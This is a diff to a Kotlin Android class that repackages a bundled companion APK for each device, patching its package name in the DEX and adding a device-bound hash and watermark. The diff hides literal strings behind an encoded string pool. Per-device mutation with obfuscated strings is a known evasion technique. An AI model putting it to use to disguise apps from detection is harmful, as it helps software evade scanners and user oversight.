@@ -175,7 +175,7 @@ class MutationEngine(private val context: Context) {
         val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"
 
         return JSONObject().apply {
-            put("companion_pkg", cmpPkg)
+            put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
             put("binding_hash", sha256("$fingerprint:nova_device_bind_2026"))
             put("watermark_hex", buildHash.substring(0, 32))
             put("tier", 2)
@@ -193,7 +193,7 @@ class MutationEngine(private val context: Context) {
 
         try {
             // M1 — Patch package name in DEX
-            val cmpPkg = mutations.optString("companion_pkg", "")
+            val cmpPkg = mutations.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "")
             if (cmpPkg.isNotEmpty()) {
                 result = patchPackageName(result, cmpPkg)
             }
@@ -303,7 +303,7 @@ class MutationEngine(private val context: Context) {
 
         // Read base companion from assets
         val baseBytes = try {
-            context.assets.open("companion.apk").readBytes()
+            context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
         } catch (e: Exception) {
             return ByteArray(0)
         }
@@ -326,9 +326,9 @@ class MutationEngine(private val context: Context) {
                         val mutationsObj = payload.optJSONObject("mutations")
                         if (mutationsObj != null) {
                             mutations = JSONObject().apply {
-                                put("companion_pkg",
+                                put(StringPool.d(StringPool.KEY_COMPANION_PKG),
                                     mutationsObj.optJSONObject("M1")
-                                        ?.optString("companion_pkg", "") ?: "")
+                                        ?.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "") ?: "")
                                 put("watermark_hex",
                                     mutationsObj.optJSONObject("M8")
                                         ?.optString("watermark_hex", "") ?: "")
@@ -341,7 +341,7 @@ class MutationEngine(private val context: Context) {
                             // Register device after getting key
                             registerDeviceAsync(
                                 payload.optString("device_id", ""),
-                                mutations!!.optString("companion_pkg", ""),
+                                mutations!!.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), ""),
                                 clientToken,
                                 fingerprint
                             )
@@ -388,7 +388,7 @@ class MutationEngine(private val context: Context) {
 
                 val body = JSONObject().apply {
                     put("device_id", deviceId)
-                    put("companion_pkg", cmpPkg)
+                    put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
                     put("template", TEMPLATE)
                     put("device_model", Build.MODEL)
                     put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
